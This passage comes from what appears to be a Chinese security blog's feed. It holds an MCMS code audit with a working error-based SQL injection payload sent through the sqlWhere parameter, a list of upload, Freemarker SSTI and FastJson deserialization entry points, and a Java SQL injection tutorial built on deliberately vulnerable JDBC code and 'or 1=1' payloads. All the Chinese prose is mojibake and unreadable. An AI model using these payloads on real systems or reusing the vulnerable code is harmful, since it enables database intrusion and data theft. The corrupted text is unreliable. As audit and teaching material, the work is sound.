class="keyword">new</span> <span class="title class_">EUListBean</span>(categoryList,(<span class="type">int</span>) BasicUtil.endPage(categoryList).getTotal()));</span><br><span class="line">&#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨å¤–éƒ¨å¯è®¿é—®æ¥å£ï¼Œ<code>@RequestMapping(&quot;/$&#123;ms.manager.path&#125;/cms/category&quot;)</code>ï¼Œ<code>$&#123;ms.manager.path&#125;</code>åœ¨é…ç½®ä¸­ä¸ºmsï¼Œæ‰¾åˆ°å…·ä½“çš„åº”ç”¨ç‚¹ï¼Œä¼ å…¥çš„å‚æ•°æ˜¯ CategoryEntity ç±»å‹çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æŸ¥è¯¢åˆ†ç±»åˆ—è¡¨æ¥å£</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> category æ ç›®å®ä½“</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;æŸ¥è¯¢åˆ†ç±»åˆ—è¡¨æ¥å£&quot;)</span></span><br><span class="line"><span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name = &quot;categoryTitle&quot;, value = &quot;æ ç›®ç®¡ç†åç§°&quot;, required =false,paramType=&quot;query&quot;),</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name = &quot;categoryParentId&quot;, value = &quot;çˆ¶ç±»å‹ç¼–å·&quot;, required =false,paramType=&quot;query&quot;),</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/list&quot;,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;cms:category:view&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResultData <span class="title function_">list</span><span class="params">(<span class="meta">@ModelAttribute</span> <span class="meta">@ApiIgnore</span> CategoryEntity category)</span> &#123;</span><br><span class="line">BasicUtil.startPage();</span><br><span class="line"><span class="type">List</span> <span class="variable">categoryList</span> <span class="operator">=</span> categoryBiz.query(category);</span><br><span class="line"><span class="keyword">return</span> ResultData.build().success(<span class="keyword">new</span> <span class="title class_">EUListBean</span>(categoryList,(<span class="type">int</span>) BasicUtil.endPage(categoryList).getTotal()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿› CategoryEntity åˆ†æå…¶ç»“æ„ï¼Œè¿›ä¸€æ­¥æ‰¾ åˆè·Ÿè¿›åˆ°BaseEntityæ‰¾<code>qlWhereList</code>å’Œ<code>SQLwhere</code>ï¼ŒSQLwhereæ˜¯jsonæ ¼å¼ï¼Œåˆ†æå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ã€‚<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-6.png" alt="æŠ“åŒ…åˆ†æ"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categoryType=1&amp;sqlWhere=%5B%7B%22action%22%3A%22and%22%2C%22field%22%3A%22content_title%22%2C%22el%22%3A%22eq%22%2C%22model%22%3A%22contentTitle%22%2C%22name%22%3A%22%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%22%2C%22type%22%3A%22input%22%2C%22value%22%3A%2212312313%22%7D%5D&amp;pageNo=1&amp;pageSize=10</span><br><span class="line">urlè§£ç ä¹‹å:</span><br><span class="line">categoryType=1&amp;sqlWhere=[&#123;&quot;action&quot;:&quot;and&quot;,&quot;field&quot;:&quot;content_title&quot;,&quot;el&quot;:&quot;eq&quot;,&quot;model&quot;:&quot;contentTitle&quot;,&quot;name&quot;:&quot;æ–‡ç« æ ‡é¢˜&quot;,&quot;type&quot;:&quot;input&quot;,&quot;value&quot;:&quot;12312313&quot;&#125;]&amp;pageNo=1&amp;pageSize=10</span><br></pre></td></tr></table></figure><p><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-7.png" alt="IDEAé‡Œé¢ä¹Ÿæœ‰è¾“å‡º"><br>æ¥ä¸‹æ¥å°è¯•ä½¿ç”¨æŠ¥é”™è¯­å¥æŸ¥è¯¢:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categoryType=1&amp;sqlWhere=[&#123;&quot;action&quot;:&quot;and&quot;,&quot;field&quot;:&quot;updatexml(1,concat(0x7e,(select user()),0x7e),1)&quot;,&quot;el&quot;:&quot;eq&quot;,&quot;model&quot;:&quot;contentTitle&quot;,&quot;name&quot;:&quot;æ–‡ç« æ ‡é¢˜&quot;,&quot;type&quot;:&quot;input&quot;,&quot;value&quot;:&quot;12312313&quot;&#125;]&amp;pageNo=1&amp;pageSize=10</span><br><span class="line"></span><br><span class="line">categoryType=1&amp;sqlWhere=%5B%7B%22action%22:%22and%22,%22field%22:%22updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%22,%22el%22:%22eq%22,%22model%22:%22contentTitle%22,%22name%22:%22%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%22,%22type%22:%22input%22,%22value%22:%2212312313%22%7D%5D&amp;pageNo=1&amp;pageSize=10</span><br></pre></td></tr></table></figure><p><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-8.png" alt="æ³¨å…¥ç»“æœ"></p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>æ¨¡æ¿ä½ç½®ä¸Šä¼ <br>&#x2F;ms&#x2F;file&#x2F;uploadTemplate.do</p><h2 id="SSTIï¼šFreemarkeræ¨¡æ¿æ³¨å…¥"><a href="#SSTIï¼šFreemarkeræ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIï¼šFreemarkeræ¨¡æ¿æ³¨å…¥"></a>SSTIï¼šFreemarkeræ¨¡æ¿æ³¨å…¥</h2><p>æºç ä½ç½®net\mingsoft\base\util\FtlUtil.java</p><h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson &lt;&#x3D;1.2.80 ååºåˆ—åŒ–"></a>FastJson &lt;&#x3D;1.2.80 ååºåˆ—åŒ–</h2><p>net&#x2F;mingsoft&#x2F;basic&#x2F;action&#x2F;web&#x2F;EditorAction.javaMap&lt;String, Object&gt; map &#x3D; (Map&lt;String, Object&gt;) JSONObject.parse(jsonConfig); &#x2F;&#x2F;ç›´æ¥è§£æäº†jsonConfig</p><p>URLï¼š@RequestMapping(â€œ&#x2F;static&#x2F;plugins&#x2F;ueditor&#x2F;{version}&#x2F;jspâ€)ï¼Œéœ€è¦version</p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘Javaä»£ç å®¡è®¡SQLæ³¨å…¥</title>
      <link href="/2024/11/05/WebSecurity/codeaudit/javacodesqlinjection/"/>
      <url>/2024/11/05/WebSecurity/codeaudit/javacodesqlinjection/</url>
      
        <content type="html"><![CDATA[<h2 id="JDBC-æ‹¼æ¥ä¸å½“é€ æˆ-SQL-æ³¨å…¥"><a href="#JDBC-æ‹¼æ¥ä¸å½“é€ æˆ-SQL-æ³¨å…¥" class="headerlink" title="JDBC æ‹¼æ¥ä¸å½“é€ æˆ SQL æ³¨å…¥"></a>JDBC æ‹¼æ¥ä¸å½“é€ æˆ SQL æ³¨å…¥</h2><h3 id="1-JDBCçš„ä¸¤ç§SQLæ‰§è¡Œæ–¹æ³•ï¼šStatement-vs-PrepareStatement"><a href="#1-JDBCçš„ä¸¤ç§SQLæ‰§è¡Œæ–¹æ³•ï¼šStatement-vs-PrepareStatement" class="headerlink" title="1. JDBCçš„ä¸¤ç§SQLæ‰§è¡Œæ–¹æ³•ï¼šStatement vs PrepareStatement"></a>1. JDBCçš„ä¸¤ç§SQLæ‰§è¡Œæ–¹æ³•ï¼š<code>Statement</code> vs <code>PrepareStatement</code></h3><p>åœ¨JDBCä¸­ï¼Œæœ‰ä¸¤ç§å¸¸ç”¨çš„æ‰§è¡ŒSQLè¯­å¥çš„æ–¹æ³•ï¼š<code>Statement</code>å’Œ<code>PrepareStatement</code>ã€‚</p><ul><li><p><strong>Statement</strong>ï¼š</p><ul><li><code>Statement</code>æ˜¯ç›´æ¥æ‹¼æ¥SQLè¯­å¥æ‰§è¡Œçš„ï¼Œæ¯æ¬¡æ‰§è¡Œæ—¶éƒ½éœ€è¦å¯¹SQLè¯­å¥é‡æ–°è¿›è¡Œç¼–è¯‘ï¼Œå¼€é”€è¾ƒå¤§ã€‚</li><li>ä¸å®‰å…¨ï¼Œå®¹æ˜“å—åˆ°SQLæ³¨å…¥æ”»å‡»çš„å½±å“ï¼Œå› ä¸ºç”¨æˆ·è¾“å…¥çš„å†…å®¹å¯ä»¥ç›´æ¥æ’å…¥åˆ°SQLè¯­å¥ä¸­å¹¶æ‰§è¡Œã€‚</li></ul></li><li><p><strong>PrepareStatement</strong>ï¼š</p><ul><li><code>PrepareStatement</code>ä¼šå¯¹SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œæ•ˆç‡æ›´é«˜ï¼Œå®‰å…¨æ€§æ›´å¥½ã€‚</li><li>æ”¯æŒå‚æ•°åŒ–æŸ¥è¯¢ï¼Œä½¿ç”¨<code>?</code>ä½œä¸ºå ä½ç¬¦ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„å‚æ•°ä½œä¸ºç‹¬ç«‹çš„å…ƒç´ ä¼ é€’ç»™æ•°æ®åº“ï¼Œå¯ä»¥é˜²æ­¢SQLæ³¨å…¥ã€‚</li><li>ç„¶è€Œï¼Œå¦‚æœå¼€å‘è€…ä½¿ç”¨<code>PrepareStatement</code>æ—¶ä»é‡‡ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼æ„å»ºSQLè¯­å¥ï¼Œåˆ™ä»ç„¶å­˜åœ¨SQLæ³¨å…¥é£é™©ã€‚</li></ul></li></ul><h3 id="2-ä½¿ç”¨Statementæ‹¼æ¥SQLè¯­å¥çš„ç¤ºä¾‹ä¸åˆ†æ"><a href="#2-ä½¿ç”¨Statementæ‹¼æ¥SQLè¯­å¥çš„ç¤ºä¾‹ä¸åˆ†æ" class="headerlink" title="2. ä½¿ç”¨Statementæ‹¼æ¥SQLè¯­å¥çš„ç¤ºä¾‹ä¸åˆ†æ"></a>2. ä½¿ç”¨<code>Statement</code>æ‹¼æ¥SQLè¯­å¥çš„ç¤ºä¾‹ä¸åˆ†æ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.jdbcinjection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/jdbcsql&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcDynamicController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/dynamic&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">jdbcdynamic</span><span class="params">(<span class="meta">@RequestParam(&quot;id&quot;)</span> String id)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException&#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id = &#x27;&quot;</span> + id + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rsUsername</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">rsPassword</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, rsUsername, rsPassword);</span><br><span class="line">            result.append(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        conn.close();</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/11/05/WebSecurity/codeaudit/javacodesqlinjection/image.png"><br>æˆ‘åœ¨æ•°æ®åº“é‡Œä½¿ç”¨ä¸‹é¢è¯­å¥åˆ›å»ºäº†æ•°æ®åº“æ’å…¥äº†ä¸€äº›æ¨¡æ‹Ÿæ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> java;</span><br><span class="line">USE java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">user</span> (</span><br><span class="line">    id <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">user</span> (id, username, password) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;user1&#x27;</span>, <span class="string">&#x27;password1&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;user2&#x27;</span>, <span class="string">&#x27;password2&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;user3&#x27;</span>, <span class="string">&#x27;password3&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>SQLæ³¨å…¥åˆ†æ</strong>ï¼š<ul><li><code>req.getParameter(&quot;id&quot;)</code>è·å–äº†ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œç›´æ¥æ‹¼æ¥åˆ°<code>sql</code>è¯­å¥ä¸­ã€‚</li><li>å¦‚æœç”¨æˆ·è¾“å…¥<code>1%27%20or%201=1%23</code>ä½œä¸º<code>id</code>å‚æ•°ï¼ŒSQLè¯­å¥å°†å˜æˆï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li><li>è¿™ä¸ªæ¡ä»¶<code>1=1</code>æ’ä¸ºçœŸï¼Œå› æ­¤æ•°æ®åº“å°†è¿”å›æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚</li></ul></li></ul><h3 id="3-PrepareStatementçš„é”™è¯¯ç”¨æ³•ç¤ºä¾‹"><a href="#3-PrepareStatementçš„é”™è¯¯ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="3. PrepareStatementçš„é”™è¯¯ç”¨æ³•ç¤ºä¾‹"></a>3. <code>PrepareStatement</code>çš„é”™è¯¯ç”¨æ³•ç¤ºä¾‹</h3><p>å³ä½¿ä½¿ç”¨äº†<code>PrepareStatement</code>ï¼Œå¦‚æœå¼€å‘è€…å°†ç”¨æˆ·è¾“å…¥é€šè¿‡æ‹¼æ¥æ–¹å¼æ’å…¥åˆ°SQLè¯­å¥ä¸­ï¼Œä»ç„¶ä¼šå‡ºç°SQLæ³¨å…¥é—®é¢˜ã€‚ä»¥ä¸‹ä»£ç å±•ç¤ºäº†è¿™ç§é”™è¯¯ç”¨æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id = &quot;</span> + req.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">out.println(sql);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">pstt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstt.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;br&gt; id: &quot;</span> + rs.getObject(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">        out.println(<span class="string">&quot;&lt;br&gt; name: &quot;</span> + rs.getObject(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">    throwables.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>é—®é¢˜åˆ†æ</strong>ï¼š<ul><li>è¿™é‡Œè™½ç„¶ä½¿ç”¨äº†<code>PreparedStatement</code>ï¼Œä½†<code>sql</code>è¯­å¥ä»ç„¶é€šè¿‡æ‹¼æ¥æ„é€ ã€‚è¿™æ„å‘³ç€åœ¨SQLæ‰§è¡Œå‰ï¼Œç”¨æˆ·çš„è¾“å…¥å·²ç»æ’å…¥åˆ°SQLè¯­å¥ä¸­ã€‚</li><li>ç”¨æˆ·ä»ç„¶å¯ä»¥é€šè¿‡è¾“å…¥ç±»ä¼¼<code>1 OR 1=1</code>çš„å­—ç¬¦ä¸²æ¥æ³¨å…¥SQLï¼Œå¯¼è‡´å’Œä¸Šä¾‹ç›¸åŒçš„é£é™©ã€‚</li></ul></li></ul><h3 id="4-æ­£ç¡®ä½¿ç”¨PrepareStatementé¿å…SQLæ³¨å…¥"><a href="#4-æ­£ç¡®ä½¿ç”¨PrepareStatementé¿å…SQLæ³¨å…¥" class="headerlink" title="4. æ­£ç¡®ä½¿ç”¨PrepareStatementé¿å…SQLæ³¨å…¥"></a>4. æ­£ç¡®ä½¿ç”¨<code>PrepareStatement</code>é¿å…SQLæ³¨å…¥</h3><p>æ­£ç¡®çš„æ–¹å¼æ˜¯ä½¿ç”¨<code>?</code>ä½œä¸ºå ä½ç¬¦ï¼Œå¹¶åœ¨æ‰§è¡ŒSQLæ—¶å°†ç”¨æˆ·è¾“å…¥çš„å‚æ•°ç»‘å®šåˆ°å ä½ç¬¦ä¸Šã€‚<code>PrepareStatement</code>ä¼šå¯¹æ¯ä¸ªå‚æ•°çš„ç±»å‹å’Œå†…å®¹è¿›è¡Œä¸¥æ ¼æ£€æŸ¥ï¼Œé¿å…å°†ç”¨æˆ·è¾“å…¥å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ¥è§£æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id = ?&quot;</span>;</span><br><span class="line">out.println(sql);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">pstt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">    pstt.setInt(<span class="number">1</span>, Integer.parseInt(req.getParameter(<span class="string">&quot;id&quot;</span>))); <span class="comment">// ä½¿ç”¨å ä½ç¬¦å¹¶ç»‘å®šå‚æ•°</span></span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstt.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;br&gt; id: &quot;</span> + rs.getObject(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">        out.println(<span class="string">&quot;&lt;br&gt; name: &quot;</span> + rs.getObject(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">    throwables.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MyBatis-æ¡†æ¶ä»£ç æ³¨å…¥"><a href="#MyBatis-æ¡†æ¶ä»£ç æ³¨å…¥" class="headerlink" title="MyBatis æ¡†æ¶ä»£ç æ³¨å…¥"></a>MyBatis æ¡†æ¶ä»£ç æ³¨å…¥</h2><h3 id="1-MyBatis-æ¡†æ¶çš„ç®€ä»‹"><a href="#1-MyBatis-æ¡†æ¶çš„ç®€ä»‹" class="headerlink" title="1. MyBatis æ¡†æ¶çš„ç®€ä»‹"></a>1. MyBatis æ¡†æ¶çš„ç®€ä»‹</h3><p>MyBatis æ˜¯ä¸€ç§å°† SQL è¯­å¥åµŒå…¥åˆ° XML é…ç½®æ–‡ä»¶ä¸­çš„æŒä¹…å±‚æ¡†æ¶ï¼Œå®ƒé€šè¿‡å°† SQL è¯­å¥å’Œ Java ä»£ç åˆ†ç¦»ï¼Œä½¿ SQL è¯­å¥çš„ç®¡ç†æ›´åŠ ç›´è§‚ã€æ˜“äºä¿®æ”¹ï¼ŒåŒæ—¶æ”¯æŒ SQL å‚æ•°åŒ–æŸ¥è¯¢ã€‚è¿™ä¸€ç‰¹ç‚¹å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæé«˜ SQL å®‰å…¨æ€§ï¼Œä½†ä¹Ÿå¯èƒ½å¼•å…¥æ–°çš„å®‰å…¨éšæ‚£ï¼Œç‰¹åˆ«æ˜¯åœ¨ä¸æ­£ç¡®ä½¿ç”¨ <code>#&#123;&#125;</code> å’Œ <code>$&#123;&#125;</code> å ä½ç¬¦çš„æƒ…å†µä¸‹ã€‚</p><h3 id="2-MyBatis-ä¸­çš„ä¸¤ç§-SQL-å‚æ•°ä¼ é€’æ–¹å¼ï¼š-å’Œ"><a href="#2-MyBatis-ä¸­çš„ä¸¤ç§-SQL-å‚æ•°ä¼ é€’æ–¹å¼ï¼š-å’Œ" class="headerlink" title="2. MyBatis ä¸­çš„ä¸¤ç§ SQL å‚æ•°ä¼ é€’æ–¹å¼ï¼š#{} å’Œ ${}"></a>2. MyBatis ä¸­çš„ä¸¤ç§ SQL å‚æ•°ä¼ é€’æ–¹å¼ï¼š<code>#&#123;&#125;</code> å’Œ <code>$&#123;&#125;</code></h3><p>åœ¨ MyBatis ä¸­ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡ <code>#&#123;&#125;</code> å’Œ <code>$&#123;&#125;</code> ä¸¤ç§æ–¹å¼ä¼ é€’å‚æ•°ï¼š</p><ul><li><p>**<code>#&#123;Parameter&#125;</code>**ï¼šä½¿ç”¨ <code>#&#123;&#125;</code> ä¼ å‚çš„æ–¹å¼ä¼šè‡ªåŠ¨å°†å‚æ•°æ›¿æ¢ä¸º SQL ä¸­çš„å ä½ç¬¦ <code>?</code>ï¼Œå¹¶åœ¨æ‰§è¡Œæ—¶è¿›è¡Œé¢„ç¼–è¯‘ã€‚å› æ­¤ï¼Œå‚æ•°ä½œä¸ºç‹¬ç«‹æ•°æ®ä¼ å…¥ SQL æ‰§è¡Œç¯å¢ƒï¼Œä¸ä¼šè¢«è§£æä¸º SQL çš„ä¸€éƒ¨åˆ†ã€‚</p><ul><li>è¿™ç§æ–¹å¼æ˜¯å‚æ•°åŒ–æŸ¥è¯¢çš„å®‰å…¨æ–¹å¼ï¼Œæœ‰æ•ˆé˜²æ­¢ SQL æ³¨å…¥ã€‚</li><li>ä¾‹å¦‚ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUsername&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.z1ng.bean.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT id, name, age FROM user WHERE name = #&#123;name&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>æ‰§è¡Œè¿‡ç¨‹</strong>ï¼š<ul><li>å½“ç”¨æˆ·è¾“å…¥ <code>name = &quot;z1ng&quot;</code> æ—¶ï¼ŒMyBatis ä¼šå°†å…¶è½¬æ¢ä¸º SQL æŸ¥è¯¢ï¼š<code>SELECT id, name, age FROM user WHERE name = ?</code></li><li>åœ¨æ•°æ®åº“æ‰§è¡Œæ—¶ï¼Œ<code>z1ng</code> ä¼šä½œä¸ºå‚æ•°ç»‘å®šåˆ° SQL ä¸­çš„ <code>?</code>ï¼Œé˜²æ­¢ SQL æ³¨å…¥ã€‚</li></ul></li></ul></li><li><p>**<code>$&#123;Parameter&#125;</code>**ï¼šä½¿ç”¨ 